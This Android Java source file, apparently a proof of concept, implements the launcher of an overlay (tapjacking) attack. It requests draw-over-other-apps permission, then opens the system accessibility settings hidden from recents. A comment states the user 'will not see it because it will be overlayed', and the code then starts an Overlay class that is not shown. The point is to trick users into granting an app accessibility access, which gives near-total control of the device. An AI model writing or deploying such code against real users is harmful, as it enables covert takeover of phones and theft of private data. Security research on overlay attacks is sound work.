package com.example.android.globalactionbarservice;

import android.content.Intent;
import android.os.Build;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Check if the app has overlay permissions and asks for it if not:
        if (!Settings.canDrawOverlays(this)) {
            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Intent myIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                startActivity(myIntent);
            }
        }

        // Retrieve the accessibility settings activity:
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);

        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                | Intent.FLAG_ACTIVITY_CLEAR_TASK
                | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);

        // Launch accessibility settings. The user will not see it because it will be overlayed:
        startActivity(intent);

        // Start overlaying:
        Overlay overlay = new Overlay(this);
        overlay.run();
    }
}
